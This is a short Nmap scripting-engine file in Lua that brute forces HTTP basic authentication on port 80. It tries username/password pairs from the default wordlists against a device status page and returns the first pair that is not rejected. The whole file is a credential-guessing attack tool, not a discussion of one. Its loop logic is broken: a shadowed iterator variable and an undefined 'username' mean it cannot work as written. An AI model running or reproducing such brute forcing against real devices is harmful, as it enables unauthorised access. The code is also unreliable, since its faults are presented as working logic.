description = [[
This script brute forces a remote target and identifies username and password
]]

categories = {"intrusive", "auth"}

require("http")
require("unpwdb")

function portrule(host, port)
        return port.number == 80
end

function action(host, port)
        local usernames, passwords
        local status
        status, usernames = unpwdb.usernames()
        status, passwords = unpwdb.passwords()

        for password in passwords do
                  for usernames in usernames do
                          local response
                          response = http.get(host, port, "/status/status_deviceinfo.htm", {auth = {username = username, password = password}})
                          if response.status and response.status ~= 401 then
                          return username ..":".. password
                          end
                  end

                  usernames("reset")

        end
end
